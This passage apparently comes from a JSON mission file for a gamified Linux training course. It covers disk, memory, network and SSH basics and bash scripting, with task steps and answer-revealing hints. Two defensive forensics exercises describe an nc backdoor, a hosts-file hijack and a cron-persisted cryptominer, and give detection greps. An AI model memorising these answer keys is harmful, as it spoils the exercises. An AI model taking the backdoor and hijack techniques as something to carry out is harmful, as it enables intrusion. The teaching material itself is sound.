            [
              "slow.log",
              "contains tick lines and a final 'done'"
            ],
            [
              "answers.md",
              "pause_key, resume_bg, hup_immune"
            ]
          ],
          "hints": [
            "pause_key is `ctrl+z` (case/spacing lenient); resume_bg is `bg`; hup_immune is `nohup`.",
            "If slow.log has no 'done' yet, the task is still running — wait a few seconds and re-check."
          ]
        },
        {
          "id": "5.4",
          "slug": "04-vital-signs",
          "title": "Vital Signs",
          "tagline": "df, du, free, uptime — read the machine's health.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/05-blue-belt/04-vital-signs/README.md",
          "intro": "'The server is slow.' A Process Tamer doesn't guess — they check vital signs. Disk full? Memory exhausted? Load through the roof? Four commands turn vague panic into a diagnosis.",
          "learn": [
            {
              "h": "Disk: df and du",
              "code": "df -h              # disk FREE per filesystem, human-readable\ndf -h /            # just the root filesystem\ndu -sh .           # total SIZE of the current directory (summary)\ndu -sh * | sort -h # size of each item, smallest→largest (sort -h!)\ndu -h --max-depth=1 /var   # where's the space going under /var",
              "label": "df = whole disks; du = specific paths"
            },
            {
              "p": "The classic 'disk full' hunt: `df -h` shows *which* filesystem is at 100%, then `du -sh * | sort -h` inside it walks you toward the culprit directory. `-h` on sort is the human-numeric sort that understands `K`, `M`, `G`."
            },
            {
              "h": "Memory: free",
              "code": "free -h\n#   total  used  free  shared  buff/cache  available\n#                                         └ the number that matters",
              "label": "Look at 'available', not 'free'"
            },
            {
              "p": "Linux deliberately uses 'free' RAM as disk cache — so a low `free` number is *healthy*, not alarming. The honest 'how much can a new program get' figure is **available**, which counts reclaimable cache. Beginners panic at `free`; pros read `available`."
            },
            {
              "h": "Load: uptime",
              "code": "uptime\n#  ... load average: 0.52, 0.48, 0.44\n#                    1min  5min  15min",
              "label": "Three numbers = three time windows"
            },
            {
              "p": "Load average is the number of processes wanting the CPU. The rough rule: compare to your core count. On a 4-core box, ~4.0 means fully busy; well above your core count means tasks are queuing (overloaded). The three numbers show the trend — rising or cooling off."
            },
            {
              "tip": "First three commands in almost every 'server feels wrong' investigation: `df -h`, `free -h`, `uptime`. Thirty seconds to rule out the big three."
            }
          ],
          "task": [
            {
              "step": "Capture disk usage. Save the df line for your root filesystem into `disk.txt`:",
              "code": "df -h | grep -i filesystem > disk.txt   # header line (portable across systems)\ndf -h / | tail -n 1 >> disk.txt          # the root filesystem row"
            },
            {
              "step": "Save the total size of THIS mission directory into `usage.txt`:",
              "code": "du -sh . > usage.txt"
            },
            {
              "step": "A captured `sample/free.txt` and `sample/uptime.txt` are provided so answers are identical for everyone. Read them and fill `answers.md`:",
              "code": "mem_available=THE_available_VALUE_FROM_sample/free.txt   # e.g. 9.2Gi\nload_1min=THE_1_MINUTE_LOAD_FROM_sample/uptime.txt      # e.g. 3.05\noverloaded=IS_1MIN_LOAD_ABOVE_4_CORES?_yes_or_no"
            }
          ],
          "artifacts": [
            [
              "disk.txt",
              "a filesystem header + your root fs line"
            ],
            [
              "usage.txt",
              "one line — this directory's total size"
            ],
            [
              "answers.md",
              "mem_available, load_1min, overloaded"
            ]
          ],
          "hints": [
            "mem_available is the last number on the `Mem:` row of sample/free.txt.",
            "The 1-minute load is the FIRST of the three load-average numbers in sample/uptime.txt.",
            "The sample shows a 4-core box with load 5.10 — that's above 4, so overloaded=yes."
          ]
        },
        {
          "id": "5.5",
          "slug": "05-boss-process-detective",
          "title": "BOSS — The Process Detective",
          "tagline": "A server is compromised. Read the evidence, name the culprit.",
          "xp": 250,
          "minutes": 45,
          "boss": true,
          "path": "missions/05-blue-belt/05-boss-process-detective/README.md",
          "intro": "Alarms are firing: CPU pinned at 100%, a process nobody recognizes. You've been handed a casefile — snapshots of `ps`, `lsof`, and the crontab from the suspect box. Use everything from this belt to trace the intrusion and write the incident report.",
          "learn": [
            {
              "h": "Boss briefing — the casefile",
              "list": [
                "`casefile/ps-dump.txt` — full process tree (UID, PID, **PPID**, CPU time, CMD)",
                "`casefile/lsof-dump.txt` — open network connections (which process, which port, to where)",
                "`casefile/crontab-dump.txt` — scheduled jobs (how attackers survive reboots)"
              ]
            },
            {
              "h": "How to think like the detective",
              "list": [
                "A process eating enormous CPU time with a weird name and an outbound connection to a random IP = a **cryptominer**.",
                "Trace its **PPID** in the ps dump — who launched it? That parent is the dropper.",
                "The **port** it talks to (in lsof) is the miner's pool connection.",
                "A **cron** entry re-running a script is the persistence mechanism — kill the process and it just comes back until you remove the cron."
              ]
            },
            {
              "h": "Tools you already own",
              "code": "grep -E \"miner|4444\" casefile/*.txt      # pull the suspicious lines together\ngrep \" 6060 \" casefile/ps-dump.txt         # find a PID's row\nsort -k? casefile/ps-dump.txt              # rank by a column",
              "label": "Filter, correlate, conclude"
            },
            {
              "tip": "The remediation order matters and is worth stating in your report: remove the cron persistence FIRST, then kill the process — otherwise cron respawns it seconds later."
            }
          ],
          "task": [
            {
              "step": "Study all three files in `casefile/`. Correlate PID ↔ PPID ↔ open port."
            },
            {
              "step": "Write your incident report `verdict.md` with exactly these keys:",
              "code": "miner_pid=PID_OF_THE_MINING_PROCESS\nminer_parent=PPID_THAT_LAUNCHED_IT\nevil_port=THE_REMOTE_POOL_PORT_IT_CONNECTS_TO\npersistence=HOW_IT_SURVIVES_REBOOT      # one word, e.g. cron\ncompromised_user=WHICH_USER_ACCOUNT_IS_RUNNING_IT\nkill_command=THE_EXACT_COMMAND_TO_FORCE-KILL_THE_MINER\nstory=ONE_OR_TWO_SENTENCES_EXPLAINING_THE_ATTACK"
            }
          ],
          "artifacts": [
            [
              "verdict.md",
              "all seven keys; story is a real explanation"
            ]
          ],
          "hints": [
            "The miner is the process burning hours of CPU TIME with a pool address in its command line.",
            "kill_command should force-kill by PID, e.g. `kill -9 6060`.",
            "persistence is one word — what mechanism re-launches it on schedule?",
            "compromised_user is the USER column of the miner's row (a service account, not a human)."
          ]
        }
      ]
    },
    {
      "n": 6,
      "slug": "06-purple-belt",
      "name": "Purple Belt",
      "color": "#a855f7",
      "rank": "Net Runner",
      "motto": "The network is just files and ports. Learn to read both.",
      "notebook": "Draw the network diagnostic ladder: have an IP? → reach the internet? → does DNS resolve? → does the service answer? Then sketch the SSH key handshake (public on the server, private with you). Why is a key better than a password?",
      "side": false,
      "missions": [
        {
          "id": "6.1",
          "slug": "01-who-am-i-online",
          "title": "Who Am I Online",
          "tagline": "ip, interfaces, and the addresses that define you.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/06-purple-belt/01-who-am-i-online/README.md",
          "intro": "Before you can debug a network, you must read your own. What's my IP? Which interface carries traffic? What's loopback? Today the `ip` command replaces the old `ifconfig`, and the numbers stop being mysterious.",
          "learn": [
            {
              "h": "The modern command",
              "code": "ip addr           # show all interfaces and their addresses (alias: ip a)\nip -brief addr    # compact one-line-per-interface view\nip route          # the routing table — where does traffic go?\nip link           # interfaces up/down, MAC addresses",
              "label": "`ip` is the modern replacement for ifconfig"
            },
            {
              "h": "Reading an interface",
              "code": "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...\n    inet 192.168.7.42/24 brd 192.168.7.255 scope global eth0\n#        └ your IP      └ /24 = subnet mask (prefix length)",
              "label": "inet = the IPv4 address"
            },
            {
              "h": "Interfaces you'll always see",
              "list": [
                "**lo** — loopback, always `127.0.0.1/8`. Traffic to yourself never leaves the machine.",
                "**eth0 / ens… / enp…** — a wired network card (names vary by distro).",
                "**wlan0 / wlp…** — wireless.",
                "**docker0 / veth…** — virtual interfaces from containers."
              ]
            },
            {
              "h": "What /24 means (CIDR)",
              "p": "The `/24` after an address is the *prefix length* — how many leading bits are the network part. `/24` = 256 total addresses, of which **254** are usable hosts (one is the network address, one the broadcast). `/16` = 65,536 addresses. The bigger the number, the smaller the network. Private ranges (`192.168.x.x`, `10.x.x.x`, `172.16–31.x.x`) never appear on the public internet."
            },
            {
              "tip": "`ip a` is muscle memory for every operator. When something 'can't connect', it's the first look: do I even have the address I think I have?"
            }
          ],
          "task": [
            {
              "step": "Capture your real interfaces (it will include the loopback line with 127.0.0.1):",
              "code": "ip addr > interfaces.txt        # if `ip` is missing, use: ifconfig > interfaces.txt"
            },
            {
              "step": "A captured `sample/ip-a.txt` is provided so answers are identical for everyone. Read it and fill `answers.md`:",
              "code": "private_ip=THE_192.168_ADDRESS_ON_eth0\nloopback=THE_LOOPBACK_ADDRESS\ncidr_hosts_24=HOW_MANY_USABLE_HOSTS_IN_A_/24_NETWORK"
            }
          ],
          "artifacts": [
            [
              "interfaces.txt",
              "your real ip/ifconfig output (contains 127.0.0.1)"
            ],
            [
              "answers.md",
              "private_ip, loopback, cidr_hosts_24"
            ]
          ],
          "hints": [
            "private_ip is the `inet` line under eth0 in sample/ip-a.txt (without the /24).",
            "loopback is always 127.0.0.1.",
            "A /24 has 256 addresses minus 2 reserved = 254 usable hosts."
          ]
        },
        {
          "id": "6.2",
          "slug": "02-ports-and-listeners",
          "title": "Ports & Listeners",
          "tagline": "ss/netstat — who is listening, and should they be?",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/06-purple-belt/02-ports-and-listeners/README.md",
          "intro": "Every network service sits on a *port* waiting for connections. Knowing what's listening — and spotting what *shouldn't* be — is core security hygiene. `ss` is the fast modern tool; a surprising open port is often the first sign of trouble.",
          "learn": [
            {
              "h": "Listing listeners",
              "code": "ss -tlnp\n#  -t tcp   -l listening only   -n numeric ports (don't resolve names)   -p process\nss -tulnp     # add -u for UDP too\nss -tan       # ALL tcp sockets (listening + established)",
              "label": "ss -tlnp = 'what TCP services are up, and who owns them'"
            },
            {
              "h": "Reading a listener line",
              "code": "LISTEN 0 128  0.0.0.0:22   0.0.0.0:*  users:((\"sshd\",pid=901,fd=3))\n#              │      │                          └ the process\n#              │      └ port 22\n#              └ 0.0.0.0 = listening on ALL interfaces (world-reachable)",
              "label": "Bind address is the security-critical part"
            },
            {
              "h": "0.0.0.0 vs 127.0.0.1 — the crucial difference",
              "p": "A service bound to **127.0.0.1** accepts connections *only from the same machine* — safe by design (databases, metrics endpoints should bind here). A service bound to **0.0.0.0** listens on every interface, reachable from the whole network. A database or cache on `0.0.0.0` is a classic exposure — that's how open Redis/Mongo instances get found and drained."
            },
            {
              "h": "Well-known ports worth memorizing",
              "list": [
                "**22** SSH · **80** HTTP · **443** HTTPS · **53** DNS",
                "**5432** PostgreSQL · **3306** MySQL · **6379** Redis · **27017** MongoDB",
                "Ports 0–1023 are 'privileged' — only root can bind them."
              ]
            },
            {
              "tip": "`ss` replaced `netstat`; if `ss` isn't there, `netstat -tlnp` gives the same picture. Both answer 'what is this box exposing?' — a question you'll ask on every server."
            }
          ],
          "task": [
            {
              "step": "Capture your own listeners into `my-listeners.txt`:",
              "code": "ss -tlnp > my-listeners.txt 2>/dev/null || netstat -tlnp > my-listeners.txt 2>/dev/null || echo \"no listener tool available\" > my-listeners.txt"
            },
            {
              "step": "A captured `sample/ss.txt` is provided. Analyze it and fill `answers.md`:",
              "code": "ssh_port=THE_PORT_sshd_LISTENS_ON\ndb_bind=THE_BIND_ADDRESS_OF_postgres     # is it local-only or exposed?\nexposed_risky=THE_PORT_OF_THE_CACHE_EXPOSED_ON_0.0.0.0   # redis is the danger\nhttps_process=THE_PROCESS_NAME_LISTENING_ON_443"
            }
          ],
          "artifacts": [
            [
              "my-listeners.txt",
              "your real socket listing (or a graceful 'no tool' note)"
            ],
            [
              "answers.md",
              "ssh_port, db_bind, exposed_risky, https_process"
            ]
          ],
          "hints": [
            "postgres in the sample binds 127.0.0.1 — that's the safe, local-only address.",
            "redis (port 6379) is bound to 0.0.0.0 in the sample — that's the risky exposure.",
            "Port 443 is served by nginx in the sample."
          ]
        },
        {
          "id": "6.3",
          "slug": "03-talk-http",
          "title": "Talk HTTP",
          "tagline": "curl and a real local server — speak the web's language.",
          "xp": 100,
          "minutes": 30,
          "boss": false,
          "path": "missions/06-purple-belt/03-talk-http/README.md",
          "intro": "The web is just requests and responses in plain text. `curl` lets you make them by hand — no browser, no mystery. You'll even stand up your own web server with one line of Python and talk to it, watching status codes tell the whole story.",
          "learn": [
            {
              "h": "curl basics",
              "code": "curl http://example.com           # fetch the body\ncurl -I http://example.com        # HEAD — response headers only\ncurl -i http://example.com        # body WITH headers\ncurl -s http://example.com        # silent (no progress meter) — great in pipes\ncurl -o page.html http://...      # save to a file",
              "label": "-I for headers, -s for scripting"
            },
            {
              "h": "Status codes — the response's verdict",
              "list": [
                "**2xx** success — **200** OK is the one you want",
                "**3xx** redirect — **301** moved permanently, **302** found/temporary",
                "**4xx** your fault — **404** not found, **403** forbidden, **401** unauthorized",
                "**5xx** server's fault — **500** internal error, **502/503** upstream/unavailable"
              ]
            },
            {
              "h": "A web server in one line",
              "code": "python3 -m http.server 8099\n# serves the CURRENT directory at http://localhost:8099\n# Ctrl+C to stop; run it in another terminal or background it with &",
              "label": "No install needed — Python is everywhere"
            },
            {
              "h": "Reading just the status code",
              "code": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://localhost:8099/\n#      │            │       └ print ONLY the status code\n#      │            └ throw the body away\n#      └ silent",
              "label": "The scripting idiom for 'did it work?'"
            },
            {
              "tip": "`curl` + status codes is how you health-check anything with a URL. `502` means the proxy can't reach the app behind it; `404` means the path is wrong, not the server. Codes localize the fault instantly."
            }
          ],
          "task": [
            {
              "step": "A `www/` directory with an `index.html` is provided. Serve it in the background:",
              "code": "cd www && python3 -m http.server 8099 & cd .."
            },
            {
              "step": "Fetch the headers of the home page and save them into `headers.txt` (must contain the HTTP status line):",
              "code": "curl -si http://localhost:8099/ | head -n 20 > headers.txt"
            },
            {
              "step": "Save the page body into `page.txt`:",
              "code": "curl -s http://localhost:8099/ > page.txt"
            },
            {
              "step": "Request a page that does NOT exist and capture the status code into `miss.txt`:",
              "code": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://localhost:8099/nope-not-here > miss.txt"
            },
            {
              "step": "Stop your server (`kill %1` or find its PID). Record in `answers.md`:",
              "code": "code_ok=STATUS_FOR_A_PAGE_THAT_EXISTS\ncode_missing=STATUS_FOR_A_PAGE_THAT_DOES_NOT\nredirect_code=THE_STATUS_CODE_FOR_A_PERMANENT_REDIRECT"
            }
          ],
          "artifacts": [
            [
              "headers.txt",
              "response headers incl. an HTTP status line"
            ],
            [
              "page.txt",
              "the served index.html body"
            ],
            [
              "miss.txt",
              "the status code for a missing page (404)"
            ],
            [
              "answers.md",
              "code_ok=200, code_missing=404, redirect_code=301"
            ]
          ],
          "hints": [
            "If curl says 'connection refused', the server isn't up — re-run the python3 http.server line.",
            "code_ok=200, code_missing=404. A permanent redirect is 301 (temporary is 302).",
            "Free the port when done so it doesn't linger: `kill %1` stops a backgrounded job."
          ]
        },
        {
          "id": "6.4",
          "slug": "04-ssh-keys",
          "title": "SSH & Keys",
          "tagline": "Generate a keypair, configure a host, never leak a secret.",
          "xp": 100,
          "minutes": 30,
          "boss": false,
          "path": "missions/06-purple-belt/04-ssh-keys/README.md",
          "intro": "SSH is how you reach every server you'll ever run. Passwords are the weak way in; **key pairs** are the professional way. Today you generate one, learn what must never leave your machine, and write an SSH config so `ssh dojo` just works.",
          "learn": [
            {
              "h": "The keypair idea",
              "p": "You generate two linked files: a **private key** (`id_ed25519`) that stays on your machine forever, and a **public key** (`id_ed25519.pub`) you copy onto servers. The server challenges you; only the matching private key can answer. The private key is the crown jewel — leak it and anyone becomes you."
            },
            {
              "h": "Generating a modern key",
              "code": "ssh-keygen -t ed25519 -C \"you@dojo\" -f ./lab_key\n#           │              │            └ output file\n#           │              └ a label/comment\n#           └ ed25519: fast, tiny, modern (prefer over old RSA)\n# creates lab_key (private) and lab_key.pub (public)",
              "label": "ed25519 is today's default choice"
            },
            {
              "h": "Permissions are enforced by SSH itself",
              "code": "chmod 700 ~/.ssh          # the directory: owner-only\nchmod 600 ~/.ssh/id_ed25519   # private key: owner read/write only\nchmod 644 ~/.ssh/id_ed25519.pub  # public key can be world-readable",
              "label": "SSH REFUSES to use a private key others can read"
            },
            {
              "p": "If your private key is group- or world-readable, `ssh` prints 'UNPROTECTED PRIVATE KEY FILE' and refuses to use it. That's a feature. **600** on the private key is not optional."
            },
            {
              "h": "The ~/.ssh/config shortcut",
              "code": "Host dojo\n    HostName 203.0.113.10\n    User tux\n    Port 2222\n    IdentityFile ~/.ssh/lab_key\n# now just: ssh dojo",
              "label": "Name your servers once, connect by nickname forever"
            },
            {
              "h": "Never commit a private key",
              "p": "Private keys, `.env` files, and credentials must never enter git. A `.gitignore` entry (`lab_key`, `*.pem`, `.env`) is your safety net. `git check-ignore lab_key` confirms a path is ignored *before* you accidentally stage it."
            },
            {
              "tip": "Real workflow: `ssh-copy-id dojo` pushes your public key to a server's `authorized_keys` so you can log in key-only. The public key is meant to be shared; the private one, never."
            }
          ],
          "task": [
            {
              "step": "Generate an ed25519 keypair in this folder, no passphrase for the lab (`-N \"\"`):",
              "code": "ssh-keygen -t ed25519 -C \"tux@dojo\" -f ./lab_key -N \"\""
            },
            {
              "step": "Lock the private key to 600:",
              "code": "chmod 600 lab_key"
            },
            {
              "step": "Write an SSH config snippet `ssh_config_lab` defining a `Host dojo` with HostName `203.0.113.10`, Port `2222`, and `IdentityFile` pointing at your lab_key (see the learn block for the shape)."
            },
            {
              "step": "Create a `.gitignore` in this folder that ignores `lab_key` (the private key). Verify it's ignored:",
              "code": "echo \"lab_key\" > .gitignore\ngit check-ignore lab_key   # should print: lab_key"
            },
            {
              "step": "Record in `answers.md`:",
              "code": "key_type=THE_ALGORITHM_YOU_USED       # ed25519\nnever_commit=WHICH_KEY_MUST_NEVER_BE_SHARED   # 'private' (the word)\nssh_dir_mode=THE_RECOMMENDED_MODE_FOR_~/.ssh   # 700"
            }
          ],
          "artifacts": [
            [
              "lab_key + lab_key.pub",
              "a real ed25519 keypair; private key is 600"
            ],
            [
              "ssh_config_lab",
              "Host dojo with HostName/Port/IdentityFile"
            ],
            [
              ".gitignore",
              "ignores lab_key (git check-ignore confirms)"
            ],
            [
              "answers.md",
              "key_type, never_commit, ssh_dir_mode"
            ]
          ],
          "hints": [
            "`-N \"\"` sets an empty passphrase so the lab key generates without prompting.",
            "The .pub file starts with `ssh-ed25519 ` — that's how the checker confirms the type.",
            "never_commit is the word `private`; ssh_dir_mode is `700`."
          ]
        },
        {
          "id": "6.5",
          "slug": "05-boss-port-detective",
          "title": "BOSS — The Port Detective",
          "tagline": "A backdoor is phoning home. Map the network crime scene.",
          "xp": 250,
          "minutes": 45,
          "boss": true,
          "path": "missions/06-purple-belt/05-boss-port-detective/README.md",
          "intro": "The blue team flagged strange outbound traffic. You've got a casefile: socket dumps, the routing table, DNS settings, the hosts file, and a captured HTTP exchange. Somewhere in there is a backdoor and a hijacked domain. Read the network, name the crime.",
          "learn": [
            {
              "h": "Boss briefing — the casefile",
              "list": [
                "`casefile/ss-dump.txt` — every socket: listeners and established connections",
                "`casefile/route-dump.txt` — the routing table (`default via` = the gateway)",
                "`casefile/resolv.conf` — which DNS server the box uses (`nameserver …`)",
                "`casefile/hosts` — static name→IP overrides (a favorite attacker trick)",
                "`casefile/curl-verbose.txt` — a captured HTTP request/response"
              ]
            },
            {
              "h": "What to look for",
              "list": [
                "A listener on a weird high port (like **31337** — hacker humor for 'eleet') owned by a tool like `nc` = a **backdoor**.",
                "An **ESTABLISHED** connection from that tool to an external IP = it's phoning home right now.",
                "An extra line in `hosts` pointing a real domain at an attacker IP = **DNS hijack** via the hosts file.",
                "The HTTP capture's status line tells you what the server answered (e.g. a 302 redirect)."
              ]
            },
            {
              "h": "Tools you own",
              "code": "grep -i listen casefile/ss-dump.txt\ngrep default casefile/route-dump.txt      # the gateway\ngrep nameserver casefile/resolv.conf      # the DNS server\ntail -n +1 casefile/hosts                 # read the whole hosts file",
              "label": "Small greps, one fact each"
            },
            {
              "tip": "The hosts file is checked *before* DNS. One malicious line there silently redirects `update-server.io` to an attacker box — so the victim downloads 'updates' from the wrong place. Reading `hosts` is a 10-second check with huge payoff."
            }
          ],
          "task": [
            {
              "step": "Prove loopback works on your own machine and save the evidence:",
              "code": "ping -c 1 127.0.0.1 | grep -i 'packets transmitted' > loopback-proof.txt"
            },
            {
              "step": "Investigate every file in `casefile/` and write `netreport.md` with exactly these keys:",
              "code": "backdoor_port=THE_SUSPICIOUS_HIGH_PORT_LISTENING\nbackdoor_tool=THE_PROGRAM_HOLDING_THAT_PORT      # one word\ngateway=THE_default_via_IP_FROM_THE_ROUTE_TABLE\ndns_server=THE_nameserver_IP\nhijacked_domain=THE_DOMAIN_MAPPED_TO_A_STRANGE_IP_IN_hosts\nredirect_status=THE_HTTP_STATUS_CODE_IN_THE_curl_CAPTURE"
            }
          ],
          "artifacts": [
            [
              "loopback-proof.txt",
              "a real ping summary line for 127.0.0.1"
            ],
            [
              "netreport.md",
              "all six keys, correct values"
            ]
          ],
          "hints": [
            "The backdoor port is the odd high one in ss-dump with `nc` next to it.",
            "gateway comes from the `default via X.X.X.X` line; dns_server from `nameserver` in resolv.conf.",
            "hijacked_domain is the domain on the suspicious third line of the hosts file.",
            "redirect_status is the number on the `HTTP/1.1 ...` line of curl-verbose.txt."
          ]
        }
      ]
    },
    {
      "n": 7,
      "slug": "07-brown-belt",
      "name": "Brown Belt",
      "color": "#a16207",
      "rank": "Script Smith",
      "motto": "Do it once by hand. Do it twice, write a script. Do it thrice, you already have one.",
      "notebook": "Draw the five cron fields (min hour dom month dow) with three of your own examples. Write the rule you never want to forget: a script without input validation is a time bomb.",
      "side": false,
      "missions": [
        {
          "id": "7.1",
          "slug": "01-script-zero",
          "title": "Script Zero",
          "tagline": "Shebang, chmod +x, exit codes — a real script from scratch.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/07-brown-belt/01-script-zero/README.md",
          "intro": "Everything you've typed by hand, a script can do on demand, forever. A shell script is just commands in a file — plus three rituals that turn a text file into a real program: the shebang, the execute bit, and an exit code.",
          "learn": [
            {
              "h": "The shebang line",
              "code": "#!/usr/bin/env bash\n# ^ MUST be the very first line. Tells the OS which interpreter runs this file.",
              "label": "#! + interpreter path"
            },
            {
              "p": "`#!/usr/bin/env bash` finds bash via your PATH — more portable than a hardcoded `#!/bin/bash` (bash lives in different places on different systems). The line looks like a comment but the kernel reads those first two bytes specially."
            },
            {
              "h": "From file to program",
              "code": "vim greet.sh          # or nano, or your editor of choice\nchmod +x greet.sh     # grant the execute bit\n./greet.sh            # run it (./ = 'right here')",
              "label": "Three steps: write, chmod, run"
            },
            {
              "h": "Comments and echo",
              "code": "#!/usr/bin/env bash\n# This is a comment — ignored by bash, read by humans.\necho \"Hello, Tux!\"    # print a line",
              "label": "# starts a comment anywhere on a line"
            },
            {
              "h": "Exit codes — how programs report success",
              "code": "exit 0     # success (0 = OK, ALWAYS)\nexit 1     # generic failure\nexit 2     # a different failure (your choice of meaning)\n# after any command:\necho $?    # the exit code of the LAST command",
              "label": "0 = success; non-zero = something went wrong"
            },
            {
              "p": "Exit codes are how scripts talk to each other and to `&&`/`||`. `cmd && echo ok` runs the echo only if cmd succeeded (exit 0); `cmd || echo failed` runs it only on failure. A script with no explicit `exit` returns the code of its last command — usually fine, but being explicit with `exit 0` signals intent."
            },
            {
              "tip": "Run `bash -n script.sh` to syntax-check a script *without executing it*. Catching a typo before it runs is a Script Smith habit."
            }
          ],
          "task": [
            {
              "step": "Write a script `greet.sh` in this folder that: starts with the bash shebang, and prints exactly `Hello, Tux!` when given a name argument OR `Hello, stranger!` when given none."
            },
            {
              "step": "Full example to adapt:",
              "code": "#!/usr/bin/env bash\nif [ -n \"$1\" ]; then\n    echo \"Hello, $1!\"\nelse\n    echo \"Hello, stranger!\"\nfi\nexit 0"
            },
            {
              "step": "Wait — read that carefully: the checker wants `Hello, Tux!` specifically when you pass `Tux`, and `Hello, stranger!` with no argument. Make it executable and test both:",
              "code": "chmod +x greet.sh\n./greet.sh Tux      # → Hello, Tux!\n./greet.sh          # → Hello, stranger!"
            },
            {
              "step": "Confirm the exit code is 0: `./greet.sh Tux; echo $?`."
            }
          ],
          "artifacts": [
            [
              "greet.sh",
              "executable, has a shebang, prints Hello, Tux! / Hello, stranger!, exits 0"
            ]
          ],
          "hints": [
            "`[ -n \"$1\" ]` is true when the first argument is non-empty. Quote $1 to survive spaces.",
            "If './greet.sh' says permission denied, you forgot `chmod +x greet.sh`.",
            "The checker runs `./greet.sh Tux` and `./greet.sh` — match both outputs exactly."
          ]
        },
        {
          "id": "7.2",
          "slug": "02-variables-substitution",
          "title": "Variables & Substitution",
          "tagline": "Store values, capture command output, do arithmetic.",
          "xp": 100,
          "minutes": 25,
          "boss": false,
          "path": "missions/07-brown-belt/02-variables-substitution/README.md",
          "intro": "A script without variables is a fancy way to retype constants. Today: naming values, the quoting rules that separate working scripts from haunted ones, capturing a command's output into a variable, and doing math in bash.",
          "learn": [
            {
              "h": "Setting and using variables",
              "code": "name=\"Tux\"          # NO spaces around = (name = \"Tux\" is an error!)\necho \"$name\"        # use with $ ; quotes preserve spaces\necho \"${name}_v2\"    # braces when the name touches other text",
              "label": "assign without spaces, expand with $"
            },
            {
              "h": "The quoting rules that bite everyone",
              "list": [
                "**\"double quotes\"** — expand variables (`\"$name\"` → Tux) but keep the value as one word",
                "**'single quotes'** — literal, NO expansion (`'$name'` → the text $name)",
                "**no quotes** — expands AND splits on spaces and globs (source of most bugs)"
              ]
            },
            {
              "p": "Rule of thumb: **quote every variable expansion** (`\"$var\"`) unless you have a specific reason not to. Unquoted `$file` with a space in it becomes two arguments and breaks silently. This one habit prevents more bugs than any other."
            },
            {
              "h": "Command substitution — capture output",
              "code": "today=$(date +%Y-%m-%d)      # run date, store its output\nfiles=$(ls | wc -l)          # count files into a variable\necho \"There are $files files, today is $today\"",
              "label": "$( ... ) runs a command and gives back its output"
            },
            {
              "h": "Arithmetic",
              "code": "a=3; b=5\nsum=$(( a + b ))         # 8  — $(( )) does integer math\nproduct=$(( a * b ))     # 15\ncount=$(( count + 1 ))   # the classic increment",
              "label": "$(( )) for integers"
            },
            {
              "h": "Positional and special parameters",
              "list": [
                "`$1 $2 $3 …` — the script's arguments",
                "`$#` — how many arguments were given",
                "`$0` — the script's own name",
                "`$@` — all arguments (quote it: `\"$@\"`)"
              ]
            },
            {
              "tip": "`set -u` at the top of a script makes it error on any *unset* variable instead of silently using empty string — catching typo'd variable names early. You'll adopt it as standard at black belt."
            }
          ],
          "task": [
            {
              "step": "Write `calc.sh` that takes two number arguments and prints two lines: `sum=<a+b>` and `product=<a*b>`. Example: `./calc.sh 3 5` prints `sum=8` then `product=15`.",
              "code": "#!/usr/bin/env bash\na=\"$1\"; b=\"$2\"\necho \"sum=$(( a + b ))\"\necho \"product=$(( a * b ))\""
            },
            {
              "step": "Write `info.sh` that prints your hostname and a number of seconds, using command substitution:",
              "code": "#!/usr/bin/env bash\necho \"host=$(hostname)\"\necho \"secs=$(date +%S)\""
            },
            {
              "step": "Make both executable and test: `./calc.sh 3 5`, `./calc.sh 10 10`, `./info.sh`."
            }
          ],
          "artifacts": [
            [
              "calc.sh",
              "executable; 3 5 → sum=8/product=15; 10 10 → sum=20/product=100"
            ],
            [
              "info.sh",
              "executable; prints host=<nonempty> and secs=<digits>"
            ]
          ],
          "hints": [
            "Assignment has NO spaces: `a=\"$1\"` not `a = \"$1\"`.",
            "Arithmetic needs the double parens: `$(( a + b ))`.",
            "The checker runs calc.sh with two different pairs — make sure it reads $1 and $2, not hardcoded numbers."
          ]
        },
        {
          "id": "7.3",
          "slug": "03-decisions",
          "title": "Decisions",
          "tagline": "if/test, exit codes, and talking to stderr.",
          "xp": 100,
          "minutes": 30,
          "boss": false,
          "path": "missions/07-brown-belt/03-decisions/README.md",
          "intro": "Scripts that can't decide are just macros. Today your scripts gain judgment: testing files, comparing values, branching, and — the mark of a pro — reporting errors on stderr with meaningful exit codes.",
          "learn": [
            {
              "h": "The if statement",
              "code": "if [ \"$x\" = \"yes\" ]; then\n    echo \"affirmative\"\nelif [ \"$x\" = \"no\" ]; then\n    echo \"negative\"\nelse\n    echo \"unclear\"\nfi",
              "label": "if … then … elif … else … fi"
            },
            {
              "h": "File test operators",
              "list": [
                "`[ -e path ]` — exists (any type)",
                "`[ -f path ]` — exists and is a regular **f**ile",
                "`[ -d path ]` — exists and is a **d**irectory",
                "`[ -r path ]` / `-w` / `-x` — readable / writable / executable",
                "`[ -s path ]` — exists and is non-empty (has **s**ize)"
              ]
            },
            {
              "h": "String and number tests",
              "code": "[ \"$a\" = \"$b\" ]    # strings equal        [ \"$a\" != \"$b\" ]  # not equal\n[ -z \"$s\" ]        # string is empty       [ -n \"$s\" ]       # string is non-empty\n[ \"$m\" -eq \"$n\" ]  # numbers: -eq -ne -lt -le -gt -ge",
              "label": "= for strings, -eq for numbers (mixing them is a classic bug)"
            },
            {
              "h": "stderr and exit codes — professional error reporting",
              "code": "if [ \"$#\" -eq 0 ]; then\n    echo \"usage: $0 <path>\" >&2    # errors go to STDERR (>&2)\n    exit 1                          # non-zero = failure\nfi",
              "label": "Errors on stderr, distinct exit codes"
            },
            {
              "p": "Why `>&2`? So error messages don't pollute the *data* a script prints on stdout. A user can do `./script > results.txt` and still SEE the errors on screen. Different exit codes (1, 2, …) let callers distinguish failure *reasons* — the checker relies on exactly this."
            },
            {
              "h": "The [[ ]] upgrade",
              "p": "Bash also offers `[[ ... ]]` — same idea, but safer (no word-splitting surprises) and with extras like `&&`, `||`, and pattern matching. Prefer `[[ ]]` in bash scripts; `[ ]` is the portable POSIX form. Both are taught here; the checker accepts either."
            }
          ],
          "task": [
            {
              "step": "Write `filecheck.sh` that inspects its first argument and behaves EXACTLY like this:"
            },
            {
